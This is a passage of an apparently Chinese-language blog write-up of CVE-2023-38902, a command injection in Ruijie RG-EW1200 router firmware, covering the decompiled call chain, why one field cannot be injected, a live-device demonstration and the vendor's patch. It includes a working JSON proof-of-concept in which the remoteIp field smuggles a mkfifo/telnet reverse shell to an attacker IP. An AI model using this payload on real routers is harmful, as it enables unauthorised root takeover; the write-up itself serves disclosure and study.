<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//remote_call</span></span><br><span class="line">  v9 = (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">5</span>];<span class="comment">// v9为remoteIp字段</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1[<span class="number">2</span>], dword_4232A8) &amp;&amp; *a1 == <span class="number">5</span> )<span class="comment">// 拿module字段中的值与字符串esw做比较，这个if进不去</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">for</span> ( i = *(<span class="type">const</span> <span class="type">char</span> **)((<span class="type">char</span> *)&amp;sid_list_by_ip + v11); ; i = *(<span class="type">const</span> <span class="type">char</span> **)i )<span class="comment">// 这个if会进去</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == (<span class="type">char</span> *)&amp;sid_list_by_ip + v11 )   <span class="comment">// 这个if也会进去</span></span><br><span class="line">    &#123;</span><br><span class="line">      pthread_rwlock_unlock(&amp;sid_mutex);       </span><br><span class="line">      <span class="keyword">goto</span> LABEL_35; <span class="comment">// 跳转至触发漏洞函数</span></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">LABEL_35:</span><br><span class="line">  v14 = sub_41A148((<span class="type">int</span>)a1);<span class="comment">//该函数存在最终的漏洞点</span></span><br><span class="line">......</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



<p>最终存在命令注入的函数 <code>sub_41A148</code> </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sub_41A148</span></span><br><span class="line">  v2 = *(_DWORD *)(a1 + <span class="number">24</span>);<span class="comment">//v2为remotePwd的值</span></span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )<span class="comment">//因为remotePwd字段没有传，所以这里为空，进入else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ufm_read_file(<span class="string">&quot;/etc/rg_config/admin&quot;</span>, &amp;v19);<span class="comment">// 没有这个文件，什么都读不出来</span></span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = (<span class="type">const</span> <span class="type">char</span> *)strdup(<span class="string">&quot;U2FsdGVkX18POF0/cM8IwywAcZUK8zQngpUv7C2zKng=&quot;</span>);<span class="comment">// 如果什么都没有读到的话，就将这个数据作为v19</span></span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v17,</span><br><span class="line">    <span class="number">511</span>,</span><br><span class="line">    <span class="string">&quot;curl -m 5 -s -k -X POST http://%s/cgi-bin/luci/api/auth -H content-type:application/json -d &#x27;&#123;\&quot;method\&quot;:\&quot;login\&quot;,\&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;params\&quot;:&#123;\&quot;username\&quot;:\&quot;admini\&quot;,\&quot;password\&quot;:\&quot;%s\&quot;,\&quot;encry\&quot;:\&quot;true\&quot;&#125;&#125;&#x27;&quot;</span>,</span><br><span class="line">    *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">20</span>),<span class="comment">//此处会将remoteIp字段拼接进去</span></span><br><span class="line">    v19);</span><br><span class="line">......</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ufm_popen(v17, &amp;v18) || !v18 )<span class="comment">//最终由ufm_popen函数导致了命令执行</span></span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)curl get sid failed!&quot;</span>, <span class="string">&quot;ufm_remote_call.c&quot;</span>, <span class="string">&quot;fetch_get_sid&quot;</span>, <span class="number">289</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">......  </span><br></pre></td></tr></table></figure>



<p>上述的调用链已经分析的很清楚了并且都标注在了注释中，理清楚这些后攻击报文的构造就显而易见了。下面说一下我认为有必要提及的两点</p>
<h4 id="为什么-remotePwd-字段无法注入命令？"><a href="#为什么-remotePwd-字段无法注入命令？" class="headerlink" title="为什么 remotePwd 字段无法注入命令？"></a>为什么 <code>remotePwd</code> 字段无法注入命令？</h4><p>在 <code>EW_3.0(1)B11P204_EW1200I</code> 固件中，其实是可以从 <code>remotePwd</code> 字段中注入命令并执行的，而且在最新的固件中，也可以看到这里判断了 <code>remotePwd</code> 是否存在，如果存在的话也可以进行拼接，最终导致命令执行，相关代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  v2 = *(_DWORD *)(a1 + <span class="number">24</span>);<span class="comment">//v19为remotePwd的值</span></span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = (<span class="type">const</span> <span class="type">char</span> *)strdup(v2);</span><br><span class="line">.......</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v17,</span><br><span class="line">    <span class="number">511</span>,</span><br><span class="line">    <span class="string">&quot;curl -m 5 -s -k -X POST http://%s/cgi-bin/luci/api/auth -H content-type:application/json -d &#x27;&#123;\&quot;method\&quot;:\&quot;login\&quot;,\&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;params\&quot;:&#123;\&quot;username\&quot;:\&quot;admini\&quot;,\&quot;password\&quot;:\&quot;%s\&quot;,\&quot;encry\&quot;:\&quot;true\&quot;&#125;&#125;&#x27;&quot;</span>,</span><br><span class="line">    *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">20</span>),</span><br><span class="line">    v19);<span class="comment">//此处是拼接v19的</span></span><br><span class="line">  <span class="keyword">if</span> ( ufm_popen(v17, &amp;v18) || !v18 )<span class="comment">//loophole</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>但在最新的固件中对 <code>remotePwd</code> 字段注入命令是不成功的。</p>
<p>因为发现在 <code>parse_obj2_cmd</code> 函数中对 <code>json</code> 数据解析时，对于 <code>remotePwd</code> 字段的处理是存在 <code>Bug</code> 的，它限制了 <code>remotePwd</code> 字段要为 <code>array</code> 类型（如下代码所示），但是前端对于 <code>array</code> 类型的 <code>remotePwd</code> 会报错。这里其实能猜测出 <code>remotePwd</code> 字段是 <code>string</code> 类型，实际上代码应该是 <code>json_object_get_type(v37) == 6</code> 。这就导致设置 <code>remotePwd</code> 类型时要么是前端报错，要么是二进制程序中判断这个类型错误，从而阴差阳错的阻止了从这里进行注入</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;remotePwd&quot;</span>, &amp;v37) == <span class="number">1</span> &amp;&amp; json_object_get_type(v37) == <span class="number">5</span> )</span><br></pre></td></tr></table></figure>



<p>而在 <code>EW_3.0(1)B11P204_EW1200I</code> 固件中，它的功能实现都是由 <code>lua</code> 语言来完成的，最终命令执行的漏洞点如下（<code>fetch_sid</code> 函数的参数 <code>password</code> 就为 <code>remotePwd</code> 字段），因此在该固件版本中可以从 <code>remotePwd</code> 字段进行注入，而之后的版本因为 <code>Bug</code> 的原因无法进行注入</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651741.png" alt="image-20230818143633392" style="zoom: 67%;" />



<h4 id="攻击报文为什么这么构造？"><a href="#攻击报文为什么这么构造？" class="headerlink" title="攻击报文为什么这么构造？"></a>攻击报文为什么这么构造？</h4><p>攻击报文如下，这些字段都是缺一不可的。而没有出现的字段都是可有可无的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;method&quot;: &quot;devCap.get&quot;,</span><br><span class="line">	&quot;params&quot;: &#123;</span><br><span class="line">        &quot;module&quot;: &quot;123&quot;,</span><br><span class="line">        &quot;remoteIp&quot;: &quot;$(mkfifo /tmp/test;telnet 192.168.45.203 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面来贴出证明这几个字段缺一不可的关键代码（其实上文的分析中都有提到，这里再汇总一下）</p>
<p><code>method</code> 和 <code>params</code> 不能为空，因为这里有如下检查，如果他们不存在的话会直接返回 <code>-1</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  v6 = json_object_object_get_ex(v3, <span class="string">&quot;params&quot;</span>, &amp;v18);</span><br><span class="line">  v7 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_27:</span><br><span class="line">    json_object_put(v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v4, <span class="string">&quot;method&quot;</span>, v19) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_26:</span><br><span class="line">    v7 = v4;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<p>而 <code>module</code> 也必须存在，并且 <code>module</code> 字段是 <code>params</code> 中的一个值。可以看到这里解析出了<code>params</code> ，给到 <code>v38</code>。而后 <code>module</code> 字段是从 <code>v38</code> 也就是 <code>params</code> 中解析出来的，如果 <code>module</code>  字段不存在的话，会执行 <code>return 0</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;params&quot;</span>, &amp;v38) != <span class="number">1</span> )<span class="comment">//</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;module&quot;</span>, &amp;v37) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">289</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">LABEL_109:</span><br><span class="line">    cmd_msg_free(v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



<p>而操作类型要设置为 <code>devCap</code> ，下面 <code>if(v3 == 3)</code> 才可以执行到 <code>remote_call</code> 函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( v3 == <span class="number">3</span> )<span class="comment">//因为操作类型设置为devCap，所以这个if可以进来</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    v5 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">20</span>);<span class="comment">//这里取了remoteIp字段</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 || !*v5 )<span class="comment">//判断remoteIp字段是否存在</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">    v6 = a1;</span><br><span class="line">    <span class="keyword">if</span> ( !is_self_ip(*(_DWORD *)(v6 + <span class="number">20</span>)) )<span class="comment">//is_self_ip函数正常情况下返回的是0，这个if可以进入</span></span><br><span class="line">    &#123;</span><br><span class="line">      remote_call((<span class="type">int</span> *)a1, (<span class="type">const</span> <span class="type">char</span> **)a2);<span class="comment">//后续的漏洞触发是在这个函数中   </span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>操作符为 <code>get</code> 是因为在 <code>Lua</code> 文件中只有 <code>opt[i]</code> 为 <code>get</code> 的时候才在 <code>devCap</code> 表中定义了字符串 <code>get</code> 所对应函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> opt[i] == <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">    devCap[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>







<h2 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h2><p>这里直接拿在京东上买的真机演示，目标路由器型号为 <code>RG-EW1200</code>  这个固件版本是 <code>217</code>（问了下客服说这个目前最新只能升级到 <code>217</code> ，所以真机演示只能打这个 <code>217</code> 的了，但搭建了 <code>219</code> 的仿真环境也是可以攻击成功的）</p>
<p>首先登录路由器的管理后台</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655305.png" alt="image-20230822171514008"></p>
<p>然后用 <code>Burp Suite</code> 抓包，拿到 <code>auth</code> 的值</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655308.png" alt="image-20230822171558399"></p>
<p>向 <code>/cgi-bin/luci/api/cmd</code> 发送 <code>POST</code> 报文</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;method&quot;: &quot;devCap.get&quot;,</span><br><span class="line">	&quot;params&quot;: &#123;</span><br><span class="line">        &quot;module&quot;: &quot;123&quot;,</span><br><span class="line">        &quot;remoteIp&quot;: &quot;$(mkfifo /tmp/test;telnet 192.168.110.171 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655314.png" alt="image-20230822172352194"></p>
<h3 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h3><p>可以看到反弹 <code>shell</code> 成功，此时拿到了路由器的最高权限</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655309.png" alt="image-20230822172340215"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>官方在 <code>EW_3.0(1)B11P226</code> 版本，对上述漏洞发布了补丁   <a target="_blank" rel="noopener" href="https://www.ruijie.com.cn/fw/rj/92255/">https://www.ruijie.com.cn/fw/rj/92255/</a></p>
<p>新添加了一个 <code>detect_remoteIp_invalid</code> 函数，该函数检查了 <code>remoteIP</code> 字段是否为纯数字或者字符 <code>.</code> ，因为正常的 <code>IP</code> 应该为 <code>xx.xx.xx.xx</code> 。这相当于对命令注入的字段做了一个过滤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">detect_remoteIp_invalid</span><span class="params">(<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  v3 = buf;</span><br><span class="line">  v4 = &amp;buf[len];</span><br><span class="line">  <span class="keyword">while</span> ( v3 != v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *v3;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v5 - <span class="number">48</span>) &lt; <span class="number">0xA</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, need [number][.][number]!&quot;</span>,</span><br><span class="line">          <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;detect_remoteIp_invalid&quot;</span>,</span><br><span class="line">          <span class="number">273</span>,</span><br><span class="line">          v5);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="参考信息"><a href="#参考信息" class="headerlink" title="参考信息"></a>参考信息</h2><p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-38902">https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-38902</a></p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/ZIKH26/18693c67ee7d2f8d2c60231b19194c37">https://gist.github.com/ZIKH26/18693c67ee7d2f8d2c60231b19194c37</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/MIPS%E6%9E%B6%E6%9E%84/" rel="tag"># MIPS架构</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/d34ee684.html" rel="prev" title="BUUCTF_de1ctf_2019_unprintable">
                  <i class="fa fa-chevron-left"></i> BUUCTF_de1ctf_2019_unprintable
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/a90346a2.html" rel="next" title="BUUCTF刷题记录">
                  BUUCTF刷题记录 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  





</body>
</html>
